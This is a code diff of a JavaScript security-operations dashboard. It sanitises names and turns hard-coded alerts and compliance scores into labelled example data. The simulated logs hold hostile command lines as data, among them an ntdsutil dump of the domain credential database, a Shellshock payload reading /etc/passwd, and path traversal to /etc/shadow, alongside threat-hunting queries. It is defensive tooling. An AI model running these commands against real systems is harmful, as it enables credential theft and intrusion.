   {ts:'2026-09-21T08:41:30Z',eventId:5145,channel:'Security',computer:'FS-01.corp.local',level:'Information',msg:'A network share object was checked to see whether client can be granted desired access.',data:{SubjectUserName:'svc-admin',ShareName:'\\\\*\\Finance$',ShareLocalPath:'D:\\Shares\\Finance',AccessMask:'0x1',IpAddress:'10.0.2.100'}},
   {ts:'2026-09-21T08:42:00Z',eventId:5145,channel:'Security',computer:'FS-01.corp.local',level:'Information',msg:'A network share object was checked to see whether client can be granted desired access.',data:{SubjectUserName:'svc-admin',ShareName:'\\\\*\\HR$',ShareLocalPath:'D:\\Shares\\HR',AccessMask:'0x1',IpAddress:'10.0.2.100'}},
   {ts:'2026-09-21T08:42:30Z',eventId:5145,channel:'Security',computer:'FS-01.corp.local',level:'Information',msg:'A network share object was checked to see whether client can be granted desired access.',data:{SubjectUserName:'svc-admin',ShareName:'\\\\*\\IT$',ShareLocalPath:'D:\\Shares\\IT',AccessMask:'0x1',IpAddress:'10.0.2.100'}},
   {ts:'2026-09-21T08:43:00Z',eventId:4688,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A new process has been created.',data:{NewProcessName:'C:\\Windows\\System32\\ntdsutil.exe',ParentProcessName:'C:\\Windows\\System32\\cmd.exe',SubjectUserName:'svc-admin',CommandLine:'ntdsutil "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\ntds_dump" q q'}},
   {ts:'2026-09-21T08:43:30Z',eventId:4799,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A security-enabled local group membership was enumerated.',data:{TargetUserName:'Administrators',SubjectUserName:'svc-admin',CallerProcessName:'C:\\Windows\\System32\\net.exe'}},
-  {ts:'2026-09-21T08:44:00Z',eventId:4657,channel:'Security',computer:'WS-JSMITH-01',level:'Information',msg:'A registry value was modified.',data:{SubjectUserName:'svc-admin',ObjectName:'\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',ObjectValueName:'SecurityUpdate',NewValue:'C:\\Windows\\Temp\\update.exe'}},
+  {ts:'2026-09-21T08:44:00Z',eventId:4657,channel:'Security',computer:'WS-USER1-01',level:'Information',msg:'A registry value was modified.',data:{SubjectUserName:'svc-admin',ObjectName:'\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',ObjectValueName:'SecurityUpdate',NewValue:'C:\\Windows\\Temp\\update.exe'}},
   {ts:'2026-09-21T08:44:30Z',eventId:4697,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A service was installed in the system.',data:{SubjectUserName:'svc-admin',ServiceName:'WinDefenderUpdate',ServiceFileName:'C:\\Windows\\Temp\\svc_backdoor.exe',ServiceType:'0x10',ServiceStartType:'2'}},
   {ts:'2026-09-21T08:45:00Z',eventId:1100,channel:'Security',computer:'DC-02.corp.local',level:'Information',msg:'The event logging service has shut down.',data:{SubjectUserName:'SYSTEM'}},
   {ts:'2026-09-21T08:45:30Z',eventId:4771,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'Kerberos pre-authentication failed.',data:{TargetUserName:'admin',Status:'0x18',IpAddress:'10.0.2.100',PreAuthType:'0x2'}},
@@ -194,12 +194,12 @@ const LEEF_LOGS = [
   {ts:'2026-09-21T08:47:30Z',raw:'LEEF:2.0|IBM|QRadar|7.5|EmailExfil|src=10.0.3.75\tsev=6\tcat=DataLoss\tmsg=Inbox rule created to forward all email to external address attacker@evil-domain.com'},
   {ts:'2026-09-21T08:48:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|ContainerEscape|src=k8s-worker-01\tsev=9\tcat=PrivilegeEscalation\tmsg=Container process attempted to access host PID namespace'},
   {ts:'2026-09-21T08:48:30Z',raw:'LEEF:2.0|IBM|QRadar|7.5|SupplyChain|src=apt-mirror\tsev=7\tcat=InitialAccess\tmsg=Package integrity verification failed for downloaded package from untrusted repository'},
-  {ts:'2026-09-21T08:49:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|ImpossibleTravel|src=198.51.100.99\tusrName=jsmith@company.com\tsev=6\tcat=InitialAccess\tmsg=Successful auth from Beijing 45 min after auth from New York'},
+  {ts:'2026-09-21T08:49:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|ImpossibleTravel|src=198.51.100.99\tusrName=user1@example.com\tsev=6\tcat=InitialAccess\tmsg=Successful auth from Beijing 45 min after auth from New York'},
 ];
 
 const ACCESS_LOGS = [
   {ts:'2026-09-21T08:45:00Z',raw:'10.0.3.50 - - [21/Sep/2026:08:45:00 +0000] "GET / HTTP/1.1" 200 5432 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"'},
-  {ts:'2026-09-21T08:45:01Z',raw:'10.0.3.50 - - [21/Sep/2026:08:45:01 +0000] "GET /static/style.css HTTP/1.1" 200 12340 "https://app.company.com/" "Mozilla/5.0"'},
+  {ts:'2026-09-21T08:45:01Z',raw:'10.0.3.50 - - [21/Sep/2026:08:45:01 +0000] "GET /static/style.css HTTP/1.1" 200 12340 "https://app.example.com/" "Mozilla/5.0"'},
   {ts:'2026-09-21T08:45:05Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:05 +0000] "GET /admin HTTP/1.1" 403 198 "-" "Nikto/2.1.6"'},
   {ts:'2026-09-21T08:45:06Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:06 +0000] "GET /wp-login.php HTTP/1.1" 404 162 "-" "Nikto/2.1.6"'},
   {ts:'2026-09-21T08:45:07Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:07 +0000] "GET /phpmyadmin HTTP/1.1" 404 162 "-" "Nikto/2.1.6"'},
@@ -219,14 +219,17 @@ const ACCESS_LOGS = [
   {ts:'2026-09-21T08:46:00Z',raw:'10.0.2.100 - svc-admin [21/Sep/2026:08:46:00 +0000] "POST /api/admin/users/export HTTP/1.1" 200 2345600 "-" "curl/7.68.0"'},
   {ts:'2026-09-21T08:46:05Z',raw:'10.0.2.100 - svc-admin [21/Sep/2026:08:46:05 +0000] "POST /api/admin/config/backup HTTP/1.1" 200 890120 "-" "curl/7.68.0"'},
   {ts:'2026-09-21T08:46:10Z',raw:'198.51.100.23 - - [21/Sep/2026:08:46:10 +0000] "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 400 166 "-" "() { :;};/bin/bash -c \'cat /etc/passwd\'"'},
-  {ts:'2026-09-21T08:46:15Z',raw:'10.0.3.50 - jsmith [21/Sep/2026:08:46:15 +0000] "GET /api/profile HTTP/1.1" 200 1230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'},
+  {ts:'2026-09-21T08:46:15Z',raw:'10.0.3.50 - user1 [21/Sep/2026:08:46:15 +0000] "GET /api/profile HTTP/1.1" 200 1230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'},
   {ts:'2026-09-21T08:46:20Z',raw:'10.0.3.70 - admin [21/Sep/2026:08:46:20 +0000] "PUT /api/admin/settings HTTP/1.1" 200 89 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'},
   {ts:'2026-09-21T08:46:25Z',raw:'203.0.113.42 - - [21/Sep/2026:08:46:25 +0000] "POST /api/search HTTP/1.1" 403 198 "-" "sqlmap/1.7"'},
   {ts:'2026-09-21T08:46:30Z',raw:'203.0.113.42 - - [21/Sep/2026:08:46:30 +0000] "GET /api/../../../etc/shadow HTTP/1.1" 400 166 "-" "sqlmap/1.7"'},
 ];
 
-// ========== ALERTS ==========
-const ALERTS = [
+// ========== EXAMPLE ALERTS ==========
+// Example dataset only: used by the explicitly-labeled "Load example data"
+// button and by the SIMULATION-ONLY Adversary Emulation scenarios. Never shown
+// as the user's alerts unless they load it themselves.
+const EXAMPLE_ALERTS = [
   {id:'ALT-001',title:'SSH Brute Force from Tor Exit Node',severity:'High',status:'New',source:'IDS',timestamp:'2026-09-21T08:01:12Z',srcIp:'185.220.101.34',dstIp:'10.0.1.5',rule:'SSH_BRUTE_FORCE',count:50,mitre:'T1110.001',analyst:null},
   {id:'ALT-002',title:'SQL Injection Attempt Detected',severity:'Critical',status:'New',source:'WAF',timestamp:'2026-09-21T08:04:15Z',srcIp:'10.0.3.50',dstIp:'10.0.1.20',rule:'SQLI_UNION',count:1,mitre:'T1190',analyst:null},
   {id:'ALT-003',title:'Cobalt Strike Beacon Communication',severity:'Critical',status:'Investigating',source:'EDR',timestamp:'2026-09-21T08:07:00Z',srcIp:'10.0.2.100',dstIp:'45.33.32.156',rule:'CS_BEACON_C2',count:15,mitre:'T1071.001',analyst:'Analyst-1'},
@@ -258,6 +261,18 @@ const ALERTS = [
   {id:'ALT-029',title:'SharePoint Sensitive File Downloaded',severity:'Medium',status:'New',source:'O365',timestamp:'2026-09-21T08:20:30Z',srcIp:'198.51.100.50',dstIp:null,rule:'O365_SENSITIVE_DOWNLOAD',count:1,mitre:'T1213.002',analyst:null},
   {id:'ALT-030',title:'Phishing URL Accessed by Employee',severity:'Medium',status:'Resolved',source:'Proxy',timestamp:'2026-09-21T08:28:30Z',srcIp:'10.0.3.75',dstIp:'login-microsoft365.evil.com',rule:'PHISHING_URL',count:1,mitre:'T1566.002',analyst:'Analyst-3'},
 ];
+
+// ========== USER WORKING DATA ==========
+// The user's alert queue and ingested logs start EMPTY. They are filled only by
+// what the user pastes/uploads in the Log Explorer, alerts they create from
+// events, or the example loader. Module-level so data survives tab/route
+// switches for the session (CITADEL does not persist to storage).
+const ALERTS = [];
+const USER_LOGS = [];
+const CT_DATA = {exampleLoaded:false, nextAlert:1};
+// Compliance self-assessment: 'framework|controlId' -> 'pass'|'partial'|'fail'.
+// Absent key = Not assessed.
+const COMPLIANCE_STATUS = {};
 
 // ========== SIGMA RULES ==========
 const SIGMA_RULES = [
@@ -339,11 +354,11 @@ const CORRELATION_RULES = [
 const HUNT_HYPOTHESES = [
   {id:'HH-001',name:'Living Off the Land Binaries',hypothesis:'Attackers may be using LOLBins (certutil, bitsadmin, mshta) for download/execution',datasource:'Windows Process Creation (4688)',query:'EventCode=4688 (NewProcessName="*certutil*" OR NewProcessName="*bitsadmin*" OR NewProcessName="*mshta*" OR NewProcessName="*regsvr32*" OR NewProcessName="*rundll32*") | stats count by NewProcessName CommandLine SubjectUserName',mitre:'T1218',status:'open',findings:0},
   {id:'HH-002',name:'DNS Tunneling Detection',hypothesis:'Compromised hosts may use DNS for C2 by encoding data in subdomain queries',datasource:'DNS Query Logs',query:'sourcetype=dns | eval len=len(query) | where len > 50 | stats count avg(len) by src_ip query | where count > 100',mitre:'T1071.004',status:'open',findings:0},
-  {id:'HH-003',name:'Beaconing Activity',hypothesis:'C2 implants beacon at regular intervals, detectable via connection frequency analysis',datasource:'Firewall/Proxy Logs',query:'sourcetype=proxy | bucket _time span=1m | stats count by src_ip dest_ip _time | eventstats stdev(count) avg(count) by src_ip dest_ip | where stdev < 0.5 AND avg > 1',mitre:'T1071.001',status:'active',findings:3},
+  {id:'HH-003',name:'Beaconing Activity',hypothesis:'C2 implants beacon at regular intervals, detectable via connection frequency analysis',datasource:'Firewall/Proxy Logs',query:'sourcetype=proxy | bucket _time span=1m | stats count by src_ip dest_ip _time | eventstats stdev(count) avg(count) by src_ip dest_ip | where stdev < 0.5 AND avg > 1',mitre:'T1071.001',status:'open',findings:0},
   {id:'HH-004',name:'Credential Stuffing Detection',hypothesis:'Attackers may use stolen credentials from breaches against our authentication systems',datasource:'Authentication Logs',query:'sourcetype=auth action=failure | stats dc(user) count by src_ip | where dc_user > 5 AND count > 20',mitre:'T1110.004',status:'open',findings:0},
-  {id:'HH-005',name:'Abnormal Service Account Usage',hypothesis:'Compromised service accounts may be used interactively or from unexpected hosts',datasource:'Windows Logon Events',query:'EventCode=4624 SubjectUserName="svc-*" (LogonType=2 OR LogonType=10) | stats count by SubjectUserName SourceIP LogonType',mitre:'T1078.002',status:'active',findings:2},
+  {id:'HH-005',name:'Abnormal Service Account Usage',hypothesis:'Compromised service accounts may be used interactively or from unexpected hosts',datasource:'Windows Logon Events',query:'EventCode=4624 SubjectUserName="svc-*" (LogonType=2 OR LogonType=10) | stats count by SubjectUserName SourceIP LogonType',mitre:'T1078.002',status:'open',findings:0},
   {id:'HH-006',name:'Internal Reconnaissance',hypothesis:'Post-exploitation recon via net, nltest, dsquery commands',datasource:'Windows Process Creation',query:'EventCode=4688 (CommandLine="*net group*" OR CommandLine="*nltest*" OR CommandLine="*dsquery*" OR CommandLine="*whoami /all*" OR CommandLine="*systeminfo*") | stats count values(CommandLine) by SubjectUserName ComputerName',mitre:'T1087',status:'open',findings:0},
-  {id:'HH-007',name:'Scheduled Task Anomalies',hypothesis:'Attackers create scheduled tasks pointing to unusual paths for persistence',datasource:'Windows Task Scheduler',query:'EventCode=4698 | where NOT match(TaskContent,"C:\\\\Windows\\\\System32") | stats count by TaskName SubjectUserName TaskContent',mitre:'T1053.005',status:'active',findings:1},
+  {id:'HH-007',name:'Scheduled Task Anomalies',hypothesis:'Attackers create scheduled tasks pointing to unusual paths for persistence',datasource:'Windows Task Scheduler',query:'EventCode=4698 | where NOT match(TaskContent,"C:\\\\Windows\\\\System32") | stats count by TaskName SubjectUserName TaskContent',mitre:'T1053.005',status:'open',findings:0},
   {id:'HH-008',name:'RDP Tunneling',hypothesis:'Attackers may tunnel RDP via SSH or port forwarding to bypass network controls',datasource:'Network Flow Data',query:'sourcetype=flow dest_port=3389 | where NOT cidrmatch("10.0.0.0/8",src_ip) | stats count by src_ip dest_ip',mitre:'T1572',status:'open',findings:0},
   {id:'HH-009',name:'WMI Lateral Movement',hypothesis:'WMI may be used for remote code execution across the network',datasource:'Windows WMI Events',query:'EventCode=4688 NewProcessName="*wmiprvse.exe" OR (NewProcessName="*wmic.exe" CommandLine="*/node:*") | stats count by SubjectUserName ComputerName CommandLine',mitre:'T1047',status:'open',findings:0},
   {id:'HH-010',name:'Shadow Admin Detection',hypothesis:'Users with high privileges not in documented admin groups',datasource:'Active Directory',query:'| ldapsearch search="(&(adminCount=1)(!(memberOf=CN=Domain Admins*)))" attrs="sAMAccountName,memberOf,adminCount"',mitre:'T1078.002',status:'open',findings:0},
@@ -352,42 +367,45 @@ const HUNT_HYPOTHESES = [
 ];
 
 // ========== COMPLIANCE FRAMEWORKS ==========
+// Reference catalog only (control IDs, names, objectives). It asserts nothing
+// about the user's organization: every control starts "Not assessed" and the
+// user records status in the Compliance tab (COMPLIANCE_STATUS).
 const COMPLIANCE = {
   nist_csf: {
     name:'NIST CSF 2.0',version:'2.0',
     categories:[
       {id:'GV',name:'Govern',controls:[
-        {id:'GV.OC-01',name:'Organizational Context',status:'pass',score:90,detail:'Organizational mission and stakeholder expectations documented'},
-        {id:'GV.RM-01',name:'Risk Management Strategy',status:'pass',score:85,detail:'Risk management strategy established and communicated'},
-        {id:'GV.SC-01',name:'Supply Chain Risk',status:'partial',score:60,detail:'Third-party risk assessment process needs improvement'},
+        {id:'GV.OC-01',name:'Organizational Context',detail:'Organizational mission is understood and informs cybersecurity risk management'},
+        {id:'GV.RM-01',name:'Risk Management Strategy',detail:'Risk management objectives are established and agreed to by stakeholders'},
+        {id:'GV.SC-01',name:'Supply Chain Risk',detail:'A cybersecurity supply chain risk management program is established'},
       ]},
       {id:'ID',name:'Identify',controls:[
-        {id:'ID.AM-01',name:'Asset Management',status:'pass',score:92,detail:'Hardware and software inventories maintained and current'},
-        {id:'ID.AM-02',name:'Software Inventory',status:'pass',score:88,detail:'Authorized software inventory maintained via CMDB'},
-        {id:'ID.RA-01',name:'Risk Assessment',status:'pass',score:82,detail:'Vulnerability identification and tracking in place'},
-        {id:'ID.RA-05',name:'Risk Prioritization',status:'partial',score:70,detail:'Risk prioritization process defined but inconsistently applied'},
+        {id:'ID.AM-01',name:'Asset Management',detail:'Inventories of hardware managed by the organization are maintained'},
+        {id:'ID.AM-02',name:'Software Inventory',detail:'Inventories of software, services and systems are maintained'},
+        {id:'ID.RA-01',name:'Risk Assessment',detail:'Vulnerabilities in assets are identified, validated and recorded'},
+        {id:'ID.RA-05',name:'Risk Prioritization',detail:'Threats, vulnerabilities, likelihoods and impacts are used to prioritize risk'},
       ]},
       {id:'PR',name:'Protect',controls:[
-        {id:'PR.AA-01',name:'Identity Management',status:'pass',score:95,detail:'Centralized identity provider with MFA enforcement'},
-        {id:'PR.AA-03',name:'Access Control',status:'pass',score:88,detail:'RBAC implemented across all critical systems'},
-        {id:'PR.DS-01',name:'Data-at-Rest Protection',status:'partial',score:75,detail:'Encryption at rest enabled for databases; some file shares unencrypted'},
-        {id:'PR.DS-02',name:'Data-in-Transit Protection',status:'pass',score:92,detail:'TLS 1.3 enforced for all external communications'},
-        {id:'PR.PS-01',name:'Configuration Management',status:'fail',score:45,detail:'Baseline configurations not consistently applied to cloud workloads'},
+        {id:'PR.AA-01',name:'Identity Management',detail:'Identities and credentials for authorized users, services and hardware are managed'},
+        {id:'PR.AA-03',name:'Access Control',detail:'Users, services and hardware are authenticated'},
+        {id:'PR.DS-01',name:'Data-at-Rest Protection',detail:'Confidentiality, integrity and availability of data at rest are protected'},
+        {id:'PR.DS-02',name:'Data-in-Transit Protection',detail:'Confidentiality, integrity and availability of data in transit are protected'},
+        {id:'PR.PS-01',name:'Configuration Management',detail:'Configuration management practices are established and applied'},
       ]},
       {id:'DE',name:'Detect',controls:[
-        {id:'DE.CM-01',name:'Network Monitoring',status:'pass',score:90,detail:'IDS/IPS deployed at all network boundaries'},
-        {id:'DE.CM-03',name:'Personnel Activity Monitoring',status:'pass',score:85,detail:'User behavior analytics deployed'},
-        {id:'DE.AE-02',name:'Event Analysis',status:'pass',score:88,detail:'SIEM with correlation rules and alert triage'},
-        {id:'DE.AE-06',name:'Incident Reporting',status:'partial',score:72,detail:'Automated alerting in place; manual escalation paths need documentation'},
+        {id:'DE.CM-01',name:'Network Monitoring',detail:'Networks and network services are monitored to find potentially adverse events'},
+        {id:'DE.CM-03',name:'Personnel Activity Monitoring',detail:'Personnel activity and technology usage are monitored for adverse events'},
+        {id:'DE.AE-02',name:'Event Analysis',detail:'Potentially adverse events are analyzed to better understand associated activities'},
+        {id:'DE.AE-06',name:'Incident Reporting',detail:'Information on adverse events is provided to authorized staff and tools'},
       ]},
       {id:'RS',name:'Respond',controls:[
-        {id:'RS.MA-01',name:'Incident Management',status:'pass',score:85,detail:'IR playbooks defined for top 10 incident types'},
-        {id:'RS.MA-03',name:'Incident Reporting',status:'partial',score:65,detail:'Internal reporting automated; regulatory notification process needs improvement'},
-        {id:'RS.MI-01',name:'Incident Mitigation',status:'pass',score:82,detail:'Containment and eradication procedures documented'},
+        {id:'RS.MA-01',name:'Incident Management',detail:'The incident response plan is executed in coordination with relevant third parties'},
+        {id:'RS.MA-03',name:'Incident Reporting',detail:'Incidents are categorized and prioritized'},
+        {id:'RS.MI-01',name:'Incident Mitigation',detail:'Incidents are contained'},
       ]},
       {id:'RC',name:'Recover',controls:[
-        {id:'RC.RP-01',name:'Recovery Planning',status:'pass',score:80,detail:'DR/BCP plans documented and tested annually'},
-        {id:'RC.CO-01',name:'Recovery Communication',status:'partial',score:68,detail:'Stakeholder communication plan exists but untested'},
+        {id:'RC.RP-01',name:'Recovery Planning',detail:'The recovery portion of the incident response plan is executed'},
+        {id:'RC.CO-01',name:'Recovery Communication',detail:'Recovery activities and progress are communicated to designated stakeholders'},
       ]},
     ]
   },
@@ -395,39 +413,39 @@ const COMPLIANCE = {
     name:'CIS Controls v8',version:'8.0',
     categories:[
       {id:'CIS-01',name:'Inventory of Enterprise Assets',controls:[
-        {id:'1.1',name:'Establish Asset Inventory',status:'pass',score:90,detail:'Automated discovery scanning weekly'},
-        {id:'1.2',name:'Address Unauthorized Assets',status:'partial',score:70,detail:'Rogue device detection in place; response SLA not met consistently'},
+        {id:'1.1',name:'Establish Asset Inventory',detail:'Establish and maintain a detailed enterprise asset inventory'},
+        {id:'1.2',name:'Address Unauthorized Assets',detail:'Ensure a process exists to address unauthorized assets on a weekly basis'},
       ]},
       {id:'CIS-02',name:'Inventory of Software Assets',controls:[
-        {id:'2.1',name:'Establish Software Inventory',status:'pass',score:85,detail:'Application whitelist maintained'},
-        {id:'2.3',name:'Address Unauthorized Software',status:'partial',score:65,detail:'App control policies defined but not enforced on all endpoints'},
+        {id:'2.1',name:'Establish Software Inventory',detail:'Establish and maintain a detailed inventory of all licensed software'},
+        {id:'2.3',name:'Address Unauthorized Software',detail:'Ensure unauthorized software is removed or documented as an exception'},
       ]},
       {id:'CIS-03',name:'Data Protection',controls:[
-        {id:'3.1',name:'Establish Data Management Process',status:'pass',score:80,detail:'Data classification policy in place'},
-        {id:'3.4',name:'Enforce Data Retention',status:'partial',score:60,detail:'Retention policies defined; automated enforcement incomplete'},
-        {id:'3.10',name:'Encrypt Sensitive Data in Transit',status:'pass',score:95,detail:'TLS 1.3 enforced enterprise-wide'},
+        {id:'3.1',name:'Establish Data Management Process',detail:'Establish and maintain a data management process'},
+        {id:'3.4',name:'Enforce Data Retention',detail:'Retain data according to the documented data management process'},
+        {id:'3.10',name:'Encrypt Sensitive Data in Transit',detail:'Encrypt sensitive data in transit (for example TLS, OpenSSH)'},
       ]},
       {id:'CIS-04',name:'Secure Configuration',controls:[
-        {id:'4.1',name:'Establish Secure Configuration Process',status:'fail',score:40,detail:'CIS benchmarks not applied to cloud workloads'},
-        {id:'4.7',name:'Manage Default Accounts',status:'pass',score:85,detail:'Default credentials changed; unnecessary accounts disabled'},
+        {id:'4.1',name:'Establish Secure Configuration Process',detail:'Establish and maintain a secure configuration process for assets and software'},
+        {id:'4.7',name:'Manage Default Accounts',detail:'Manage default accounts on enterprise assets and software'},
       ]},
       {id:'CIS-05',name:'Account Management',controls:[
-        {id:'5.1',name:'Establish Account Inventory',status:'pass',score:92,detail:'Centralized IAM with periodic access reviews'},
-        {id:'5.2',name:'Use Unique Passwords',status:'pass',score:90,detail:'Password policy enforced via AD GPO'},
-        {id:'5.4',name:'Restrict Admin Privileges',status:'pass',score:88,detail:'PAM solution deployed for privileged access'},
+        {id:'5.1',name:'Establish Account Inventory',detail:'Establish and maintain an inventory of all accounts'},
+        {id:'5.2',name:'Use Unique Passwords',detail:'Use unique passwords for all enterprise assets'},
+        {id:'5.4',name:'Restrict Admin Privileges',detail:'Restrict administrator privileges to dedicated administrator accounts'},
       ]},
       {id:'CIS-06',name:'Access Control Management',controls:[
-        {id:'6.1',name:'Establish Access Granting Process',status:'pass',score:85,detail:'Ticketed access request workflow'},
-        {id:'6.5',name:'Require MFA for Admin Access',status:'pass',score:95,detail:'MFA enforced for all admin and remote access'},
+        {id:'6.1',name:'Establish Access Granting Process',detail:'Establish and follow a process for granting access to enterprise assets'},
+        {id:'6.5',name:'Require MFA for Admin Access',detail:'Require MFA for all administrative access accounts'},
       ]},
       {id:'CIS-08',name:'Audit Log Management',controls:[
-        {id:'8.1',name:'Establish Audit Log Process',status:'pass',score:88,detail:'Centralized log collection to SIEM'},
-        {id:'8.2',name:'Collect Audit Logs',status:'pass',score:85,detail:'Logs from all critical systems forwarded'},
-        {id:'8.5',name:'Collect DNS Query Logs',status:'pass',score:90,detail:'All DNS queries logged and analyzed'},
+        {id:'8.1',name:'Establish Audit Log Process',detail:'Establish and maintain an audit log management process'},
+        {id:'8.2',name:'Collect Audit Logs',detail:'Collect audit logs and ensure logging is enabled across enterprise assets'},
+        {id:'8.5',name:'Collect DNS Query Logs',detail:'Collect DNS query audit logs where appropriate and supported'},
       ]},
       {id:'CIS-13',name:'Network Monitoring and Defense',controls:[
-        {id:'13.1',name:'Centralize Security Event Alerting',status:'pass',score:88,detail:'SIEM with real-time alerting'},
-        {id:'13.6',name:'Collect Network Traffic Flow Logs',status:'partial',score:72,detail:'NetFlow collected at perimeter; internal flow logging incomplete'},
+        {id:'13.1',name:'Centralize Security Event Alerting',detail:'Centralize security event alerting across enterprise assets'},
+        {id:'13.6',name:'Collect Network Traffic Flow Logs',detail:'Collect network traffic flow logs for review and alerting'},
       ]},
     ]
   },
@@ -435,67 +453,42 @@ const COMPLIANCE = {
     name:'SOC 2 Type II',version:'2017',
     categories:[
       {id:'CC1',name:'Control Environment',controls:[
-        {id:'CC1.1',name:'COSO Principle 1',status:'pass',score:90,detail:'Commitment to integrity and ethical values demonstrated'},
-        {id:'CC1.2',name:'COSO Principle 2',status:'pass',score:85,detail:'Board exercises oversight over internal controls'},
+        {id:'CC1.1',name:'COSO Principle 1',detail:'The entity demonstrates a commitment to integrity and ethical values'},
+        {id:'CC1.2',name:'COSO Principle 2',detail:'The board demonstrates independence and exercises oversight of internal control'},
       ]},
       {id:'CC2',name:'Communication and Information',controls:[
-        {id:'CC2.1',name:'COSO Principle 13',status:'pass',score:82,detail:'Relevant quality information obtained and communicated'},
-        {id:'CC2.2',name:'COSO Principle 14',status:'partial',score:68,detail:'Internal communication of control objectives needs improvement'},
+        {id:'CC2.1',name:'COSO Principle 13',detail:'The entity obtains or generates and uses relevant, quality information'},
+        {id:'CC2.2',name:'COSO Principle 14',detail:'The entity internally communicates information needed to support internal control'},
       ]},
       {id:'CC3',name:'Risk Assessment',controls:[
-        {id:'CC3.1',name:'COSO Principle 6',status:'pass',score:88,detail:'Risk assessment objectives specified'},
-        {id:'CC3.2',name:'COSO Principle 7',status:'pass',score:80,detail:'Risks identified and analyzed'},
+        {id:'CC3.1',name:'COSO Principle 6',detail:'The entity specifies objectives with sufficient clarity to identify and assess risks'},
+        {id:'CC3.2',name:'COSO Principle 7',detail:'The entity identifies and analyzes risks to the achievement of its objectives'},
       ]},
       {id:'CC5',name:'Control Activities',controls:[
-        {id:'CC5.1',name:'COSO Principle 10',status:'pass',score:85,detail:'Control activities selected and developed'},
-        {id:'CC5.2',name:'COSO Principle 11',status:'pass',score:82,detail:'Technology general controls in place'},
+        {id:'CC5.1',name:'COSO Principle 10',detail:'The entity selects and develops control activities that mitigate risks'},
+        {id:'CC5.2',name:'COSO Principle 11',detail:'The entity selects and develops general control activities over technology'},
       ]},
       {id:'CC6',name:'Logical and Physical Access',controls:[
-        {id:'CC6.1',name:'Logical Access Security',status:'pass',score:92,detail:'Logical access controls implemented'},
-        {id:'CC6.2',name:'User Access Provisioning',status:'pass',score:88,detail:'Access provisioning based on job function'},
-        {id:'CC6.3',name:'Access Removal',status:'partial',score:72,detail:'Offboarding access removal within 24h for most; some legacy systems delayed'},
-        {id:'CC6.6',name:'System Boundaries',status:'pass',score:90,detail:'Network segmentation and boundary protection in place'},
+        {id:'CC6.1',name:'Logical Access Security',detail:'Logical access security software, infrastructure and architectures are implemented'},
+        {id:'CC6.2',name:'User Access Provisioning',detail:'New users are registered and authorized before credentials are issued'},
+        {id:'CC6.3',name:'Access Removal',detail:'Access is modified or removed based on roles, responsibilities and changes'},
+        {id:'CC6.6',name:'System Boundaries',detail:'Logical access security measures protect against threats from outside system boundaries'},
       ]},
       {id:'CC7',name:'System Operations',controls:[
-        {id:'CC7.1',name:'Detect/Monitor Events',status:'pass',score:88,detail:'Continuous monitoring and alerting configured'},
-        {id:'CC7.2',name:'Monitor System Components',status:'pass',score:85,detail:'Infrastructure monitoring with automated alerts'},
-        {id:'CC7.3',name:'Evaluate Security Events',status:'pass',score:82,detail:'Security events evaluated and classified'},
-        {id:'CC7.4',name:'Respond to Events',status:'partial',score:75,detail:'Response procedures defined; tabletop exercises scheduled'},
+        {id:'CC7.1',name:'Detect/Monitor Events',detail:'Detection and monitoring procedures identify configuration changes and new vulnerabilities'},
+        {id:'CC7.2',name:'Monitor System Components',detail:'System components are monitored for anomalies indicative of malicious acts'},
+        {id:'CC7.3',name:'Evaluate Security Events',detail:'Security events are evaluated to determine whether they are incidents'},
+        {id:'CC7.4',name:'Respond to Events',detail:'Identified security incidents are responded to with a defined program'},
       ]},
       {id:'CC8',name:'Change Management',controls:[
-        {id:'CC8.1',name:'Change Authorization',status:'pass',score:90,detail:'Change management board reviews all production changes'},
+        {id:'CC8.1',name:'Change Authorization',detail:'Changes to infrastructure, data and software are authorized, tested and approved'},
       ]},
       {id:'CC9',name:'Risk Mitigation',controls:[
-        {id:'CC9.1',name:'Risk Mitigation Activities',status:'pass',score:85,detail:'Compensating controls documented for accepted risks'},
-        {id:'CC9.2',name:'Vendor Risk Management',status:'partial',score:65,detail:'Vendor assessments conducted but frequency needs increase'},
+        {id:'CC9.1',name:'Risk Mitigation Activities',detail:'Risk mitigation activities are identified for potential business disruptions'},
+        {id:'CC9.2',name:'Vendor Risk Management',detail:'Risks associated with vendors and business partners are assessed and managed'},
       ]},
     ]
   }
-};
-
-// ========== SOC METRICS ==========
-const SOC_METRICS = {
-  mttd: {current:12,target:10,unit:'min',trend:[-18,-15,-14,-12,-13,-11,-12]},
-  mttr: {current:45,target:30,unit:'min',trend:[62,55,50,48,47,44,45]},
-  alertVolume: {today:284,yesterday:312,week:[256,289,301,312,278,295,284]},
-  falsePositiveRate: {current:18,target:15,unit:'%',trend:[25,22,21,20,19,18,18]},
-  escalationRate: {current:8,target:5,unit:'%'},
-  closedToday: 198,
-  openAlerts: 86,
-  criticalOpen: 12,
-  analystLoad: [
-    {name:'Analyst-1',open:22,closed:45,avgTime:38},
-    {name:'Analyst-2',open:18,closed:52,avgTime:32},
-    {name:'Analyst-3',open:15,closed:61,avgTime:28},
-    {name:'Analyst-4',open:12,closed:40,avgTime:42},
-  ],
-  shifts: [
-    {shift:'Day (06:00-14:00)',analysts:['Analyst-1','Analyst-2'],lead:'Analyst-1',alerts:142},
-    {shift:'Swing (14:00-22:00)',analysts:['Analyst-3','Analyst-4'],lead:'Analyst-3',alerts:98},
-    {shift:'Night (22:00-06:00)',analysts:['Analyst-5','Analyst-6'],lead:'Analyst-5',alerts:44},
-  ],
